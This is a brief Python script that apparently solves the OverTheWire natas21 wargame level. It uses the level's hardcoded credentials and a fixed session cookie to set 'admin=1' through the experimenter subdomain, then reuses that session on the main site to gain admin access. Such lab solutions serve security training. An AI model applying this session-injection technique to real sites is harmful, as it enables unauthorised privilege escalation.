#!/bin/python

import requests

url1 = "http://natas21.natas.labs.overthewire.org/index.php"
url2 = "http://natas21-experimenter.natas.labs.overthewire.org/index.php"

user = "natas21"
pwd = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"

s = requests.session()


cookies= {"PHPSESSID" : "h4ck3d"}
parameters = "debug&submit&test=1&admin=1"
r = s.get(url2 + "?" + parameters, cookies=cookies, auth=(user,pwd))
print r.content

r = s.get(url1, cookies=cookies, auth=(user,pwd))
print r.content